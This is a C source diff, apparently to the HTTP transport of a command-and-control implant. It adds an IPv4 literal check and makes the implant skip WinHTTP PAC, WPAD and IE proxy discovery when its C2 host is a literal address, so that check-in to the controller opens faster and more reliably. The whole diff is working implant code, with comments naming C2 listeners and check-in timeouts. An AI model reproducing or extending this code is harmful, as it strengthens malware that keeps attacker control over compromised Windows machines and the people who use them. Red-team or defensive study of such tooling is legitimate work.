@@ -178,6 +178,84 @@ static LPWSTR HttpComposeUrlForProxyLookup(
 }
 
 /*!
+ * Strict dotted-decimal IPv4 check for the WinHTTP transport Host field (no port).
+ */
+static BOOL HttpIsLiteralIpv4Host(
+    LPCWSTR Host
+)
+{
+    DWORD Parts   = 0;
+    DWORD Val     = 0;
+    BOOL  HasDigs = FALSE;
+
+    if ( ! Host || ! Host[ 0 ] ) {
+        return FALSE;
+    }
+
+    for ( SIZE_T i = 0; ; i++ ) {
+        WCHAR Ch = Host[ i ];
+
+        if ( Ch >= L'0' && Ch <= L'9' ) {
+            Val = Val * 10 + ( DWORD )( Ch - L'0' );
+            if ( Val > 255 ) {
+                return FALSE;
+            }
+            HasDigs = TRUE;
+        } else if ( Ch == L'.' || Ch == L'\0' ) {
+            if ( ! HasDigs ) {
+                return FALSE;
+            }
+            Parts++;
+            Val     = 0;
+            HasDigs = FALSE;
+            if ( Ch == L'\0' ) {
+                break;
+            }
+            if ( Parts >= 4 ) {
+                /* Only four octets allowed; reject 1.2.3.4.trailing */
+                if ( Host[ i + 1 ] != L'\0' ) {
+                    return FALSE;
+                }
+            }
+        } else {
+            return FALSE;
+        }
+    }
+
+    return Parts == 4;
+}
+
+/*!
+ * When the C2 host is a literal address, PAC / WPAD / IE auto-proxy cannot help and
+ * can stall WinHttpSendRequest long enough that check-in never opens TCP (vudj9).
+ * Skip all WinHttpGetProxyForUrl / IE-config work for these hosts.
+ */
+static BOOL HttpHostSkipsWinHttpAutoproxy(
+    LPCWSTR Host
+)
+{
+    if ( ! Host || ! Host[ 0 ] ) {
+        return FALSE;
+    }
+
+    /* Bracketed IPv6 as passed to WinHttpConnect, e.g. [::1] */
+    if ( Host[ 0 ] == L'[' ) {
+        return TRUE;
+    }
+
+    if ( HttpIsLiteralIpv4Host( Host ) ) {
+        return TRUE;
+    }
+
+    /* Unbracketed IPv6 / zone (no dots in typical v6 host field) */
+    if ( WcsStr( Host, L":" ) != NULL && WcsStr( Host, L"." ) == NULL ) {
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+/*!
  * @brief
  *  send a http request
  *
@@ -359,55 +437,81 @@ BOOL HttpSend(
         }
 
     } else if ( ! Instance->LookedForProxy ) {
-        WCHAR  UrlForWinHttpProxy[ 1024 ];
-        LPWSTR ProxyUrlLookup = HttpComposeUrlForProxyLookup(
-            UrlForWinHttpProxy,
-            sizeof( UrlForWinHttpProxy ) / sizeof( UrlForWinHttpProxy[ 0 ] ),
-            HttpEndpoint
-        );
+        PHOST_DATA CurHost    = Instance->Config.Transport.Host;
+        LPCWSTR    ConnHost   = ( CurHost && CurHost->Host ) ? CurHost->Host : NULL;
+        BOOL       SkipAutoPx = ConnHost && HttpHostSkipsWinHttpAutoproxy( ConnHost );
 
-        /*
-         * IE/LAN settings first: lab VMs usually use direct outbound routing with no PAC.
-         * Historically WinHttpGetProxyForUrl(AUTO_DETECT) ran before IE lookup and DHCP WPAD
-         * could stall until check-in timed out (red-cell-c2-vudj9).
-         *
-         * When IE reports auto-detect only (or WinHttpGetIEProxyConfigForCurrentUser fails),
-         * run WPAD via DNS only - DHCP probes add multi-second latency without helping typical C2 listeners.
-         */
-        if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
-            if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
-                ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-                ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
-                ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
+        if ( SkipAutoPx ) {
+            /* Direct connect; avoids WinHttpGetProxyForUrl / PAC stalls on literal IPs (red-cell-c2-vudj9). */
+            Instance->LookedForProxy = TRUE;
+        } else {
+            WCHAR  UrlForWinHttpProxy[ 1024 ];
+            LPWSTR ProxyUrlLookup = HttpComposeUrlForProxyLookup(
+                UrlForWinHttpProxy,
+                sizeof( UrlForWinHttpProxy ) / sizeof( UrlForWinHttpProxy[ 0 ] ),
+                HttpEndpoint
+            );
 
-                PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
+            /*
+             * IE/LAN settings first: lab VMs usually use direct outbound routing with no PAC.
+             * Historically WinHttpGetProxyForUrl(AUTO_DETECT) ran before IE lookup and DHCP WPAD
+             * could stall until check-in timed out (red-cell-c2-vudj9).
+             *
+             * When IE reports auto-detect only (or WinHttpGetIEProxyConfigForCurrentUser fails),
+             * run WPAD via DNS only - DHCP probes add multi-second latency without helping typical C2 listeners.
+             */
+            if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
+                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
+                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
+                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
 
-                Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
-                Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
-                MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
-
-                ProxyConfig.lpszProxy       = NULL;
-                ProxyConfig.lpszProxyBypass = NULL;
-            } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
-                AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
-                AutoProxyOptions.dwAutoDetectFlags = 0;
-                AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
-                AutoProxyOptions.lpvReserved       = NULL;
-                AutoProxyOptions.dwReserved        = 0;
-                AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
-
-                PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
-
-                if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
-                    if ( ProxyInfo.lpszProxy ) {
-                        PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
-                    }
+                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
 
                     Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                     Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                     MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
+
+                    ProxyConfig.lpszProxy       = NULL;
+                    ProxyConfig.lpszProxyBypass = NULL;
+                } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
+                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
+                    AutoProxyOptions.dwAutoDetectFlags = 0;
+                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
+                    AutoProxyOptions.lpvReserved       = NULL;
+                    AutoProxyOptions.dwReserved        = 0;
+                    AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+
+                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
+
+                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
+                        if ( ProxyInfo.lpszProxy ) {
+                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                        }
+
+                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
+                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
+                    }
+                } else if ( ProxyConfig.fAutoDetect ) {
+                    AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
+                    AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DNS_A;
+                    AutoProxyOptions.lpszAutoConfigUrl      = NULL;
+                    AutoProxyOptions.lpvReserved            = NULL;
+                    AutoProxyOptions.dwReserved             = 0;
+                    AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+
+                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
+                        if ( ProxyInfo.lpszProxy ) {
+                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                        }
+
+                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
+                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
+                    }
                 }
-            } else if ( ProxyConfig.fAutoDetect ) {
+            } else {
                 AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
                 AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DNS_A;
                 AutoProxyOptions.lpszAutoConfigUrl      = NULL;
@@ -425,26 +529,9 @@ BOOL HttpSend(
                     MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                 }
             }
-        } else {
-            AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
-            AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DNS_A;
-            AutoProxyOptions.lpszAutoConfigUrl      = NULL;
-            AutoProxyOptions.lpvReserved            = NULL;
-            AutoProxyOptions.dwReserved             = 0;
-            AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
 
-            if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
-                if ( ProxyInfo.lpszProxy ) {
-                    PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
-                }
-
-                Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
-                Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
-                MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
-            }
+            Instance->LookedForProxy = TRUE;
         }
-
-        Instance->LookedForProxy = TRUE;
     }
 
     if ( Instance->ProxyForUrl ) {
